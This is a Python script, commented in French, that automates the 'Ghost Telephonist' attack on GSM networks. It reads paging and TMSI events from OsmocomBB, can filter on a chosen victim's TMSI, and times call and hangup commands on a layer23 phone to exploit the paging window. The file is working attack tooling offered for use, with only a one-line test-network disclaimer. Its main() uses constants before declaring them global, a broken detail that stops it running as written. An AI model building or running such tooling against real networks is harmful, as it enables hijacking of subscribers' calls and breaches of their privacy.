#!/usr/bin/env python3
# ghost-controller.py
# Pilotage automatique "Ghost Telephonist"
# - écoute /tmp/osmocom_mi (événements MI/TMSI/paging)
# - pilote la VTY de layer23 (telnet 127.0.0.1:4247) : call/hangup cadencés
# Usage:
#   1) Lancer osmocon avec -t /tmp/osmocom_mi
#   2) Lancer layer23/mobile (VTY sur 4247)
#   3) python3 ghost-controller.py --msisdn 06XXXXXXXX
#
# ⚠️ Test uniquement en PLMN privé / SIMs de test autorisées.

import asyncio, argparse, re, time
from collections import deque

# --------- Config par défaut (override par CLI) ----------
MI_SOCKET_PATH_DEFAULT = "/tmp/osmocom_mi"
VTY_HOST_DEFAULT = "127.0.0.1"
VTY_PORT_DEFAULT = 4247

# Fenêtres/tempo (ms)
PAGE_TRIGGER_WINDOW_MS = 650      # fenêtre max après détection paging pour (re)call
CALL_HOLD_MS = 1800               # durée de maintien d'appel avant hangup forcé
RECALL_DELAY_MS = 220             # délai min entre hangup et recall
MIN_GAP_BETWEEN_ATTEMPTS_MS = 900 # anti-boucle trop agressive

# Regex d’exemple (adapte-les à tes logs)
# Exemples visés:
#   "[2025-08-10 12:34:56.789] PCH: paging TMSI=0x1234ABCD LAC=xxxx"
#   "MI: seen TMSI 0x1234ABCD"
RE_PAGING = re.compile(r".*paging.*TMSI[=\s](0x[0-9A-Fa-f]+)", re.I)
RE_MI     = re.compile(r".*\bMI:.*TMSI[=\s](0x[0-9A-Fa-f]+)", re.I)

# Optionnel: filtre une victime spécifique
TARGET_TMSI = None   # ex: "0x1234ABCD" si tu veux cibler

PROMPT = b"> "  # prompt VTY (souvent "OsmocomBB> " ou "VTY> "); on reste permissif

class VTY:
    def __init__(self, host, port):
        self.host, self.port = host, port
        self.rw = None

    async def connect(self):
        while True:
            try:
                reader, writer = await asyncio.open_connection(self.host, self.port)
                self.rw = (reader, writer)
                # Passe en enable; ignore la réponse
                await self.cmd("enable")
                return
            except Exception as e:
                print(f"[VTY] Connexion échouée: {e}; retry dans 1s")
                await asyncio.sleep(1)

    async def cmd(self, s):
        if not self.rw:
            await self.connect()
        reader, writer = self.rw
        try:
            writer.write((s + "\n").encode())
            await writer.drain()
            # Lire jusqu’à un prompt (timeout court pour ne pas bloquer)
            try:
                await asyncio.wait_for(reader.readuntil(PROMPT), timeout=0.5)
            except asyncio.TimeoutError:
                pass
        except Exception as e:
            print(f"[VTY] Erreur '{s}': {e}. Reconnexion…")
            self.rw = None
            await asyncio.sleep(0.2)
            await self.connect()

    async def call(self, msisdn):
        print(f"[VTY] CALL {msisdn}")
        await self.cmd(f"call 1 {msisdn}")

    async def kill(self):
        print("[VTY] CALL KILL")
        await self.cmd("call 1 kill")

class MISocket:
    def __init__(self, path):
        self.path = path
        self.reader = None
        self.writer = None

    async def connect(self):
        while True:
            try:
                self.reader, self.writer = await asyncio.open_unix_connection(self.path)
                return
            except Exception as e:
                print(f"[MI] Connexion '{self.path}' échouée: {e}; retry dans 1s")
                await asyncio.sleep(1)

    async def lines(self):
        if not self.reader:
            await self.connect()
        while True:
            try:
                line = await self.reader.readline()
                if not line:
                    raise ConnectionResetError("EOF socket MI")
                yield line.decode(errors="replace").rstrip()
            except Exception as e:
                print(f"[MI] Erreur lecture: {e}. Reconnexion…")
                self.reader = self.writer = None
                await asyncio.sleep(0.3)
                await self.connect()

def now_ms():
    return int(time.monotonic() * 1000)

class GhostController:
    def __init__(self, vty, mi, msisdn, target_tmsi=None):
        self.vty = vty
        self.mi = mi
        self.msisdn = msisdn
        self.target_tmsi = target_tmsi.upper() if target_tmsi else None

        self.last_paging_ms = 0
        self.last_attempt_ms = 0
        self.call_active = False
        self.ev_buf = deque(maxlen=64)

    def _match_tmsi(self, line):
        # Retourne (tmsi_str | None)
        for rx in (RE_PAGING, RE_MI):
            m = rx.match(line)
            if m:
                return m.group(1).upper()
        return None

    def _eligible(self, tmsi):
        if self.target_tmsi and tmsi:
            return tmsi == self.target_tmsi
        return True  # pas de filtre : opportuniste

    async def _maybe_call(self):
        t = now_ms()
        if self.call_active:
            return
        if t - self.last_paging_ms > PAGE_TRIGGER_WINDOW_MS:
            return
        if t - self.last_attempt_ms < MIN_GAP_BETWEEN_ATTEMPTS_MS:
            return

        self.last_attempt_ms = t
        self.call_active = True
        await self.vty.call(self.msisdn)
        # planifie hangup forcé
        asyncio.create_task(self._delayed_hangup())

    async def _delayed_hangup(self):
        await asyncio.sleep(CALL_HOLD_MS / 1000.0)
        await self.vty.kill()
        self.call_active = False
        await asyncio.sleep(RECALL_DELAY_MS / 1000.0)

    async def run(self):
        # Connexions initiales
        await self.vty.connect()
        async for line in self.mi.lines():
            self.ev_buf.append(line)
            tmsi = self._match_tmsi(line)
            if tmsi and self._eligible(tmsi):
                self.last_paging_ms = now_ms()
                print(f"[MI] Paging/MI vu pour {tmsi} -> fenêtre ouverte {PAGE_TRIGGER_WINDOW_MS}ms")
                # Déclenchement opportuniste
                asyncio.create_task(self._maybe_call())

async def main():
    ap = argparse.ArgumentParser(description="Ghost Telephonist controller")
    ap.add_argument("--mi-sock", default=MI_SOCKET_PATH_DEFAULT, help="Socket UNIX MI/TMSI (osmocon -t)")
    ap.add_argument("--vty-host", default=VTY_HOST_DEFAULT)
    ap.add_argument("--vty-port", type=int, default=VTY_PORT_DEFAULT)
    ap.add_argument("--msisdn", required=True, help="Numéro à appeler (MO) depuis la C123")
    ap.add_argument("--target-tmsi", default=None, help="Filtrer sur un TMSI (ex 0x1234ABCD)")
    ap.add_argument("--page-window-ms", type=int, default=PAGE_TRIGGER_WINDOW_MS)
    ap.add_argument("--call-hold-ms", type=int, default=CALL_HOLD_MS)
    ap.add_argument("--recall-delay-ms", type=int, default=RECALL_DELAY_MS)
    ap.add_argument("--min-gap-ms", type=int, default=MIN_GAP_BETWEEN_ATTEMPTS_MS)
    args = ap.parse_args()

    global PAGE_TRIGGER_WINDOW_MS, CALL_HOLD_MS, RECALL_DELAY_MS, MIN_GAP_BETWEEN_ATTEMPTS_MS
    PAGE_TRIGGER_WINDOW_MS = args.page_window_ms
    CALL_HOLD_MS = args.call_hold_ms
    RECALL_DELAY_MS = args.recall_delay_ms
    MIN_GAP_BETWEEN_ATTEMPTS_MS = args.min_gap_ms

    vty = VTY(args.vty_host, args.vty_port)
    mi = MISocket(args.mi_sock)
    ctrl = GhostController(vty, mi, args.msisdn, target_tmsi=args.target_tmsi)
    await ctrl.run()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
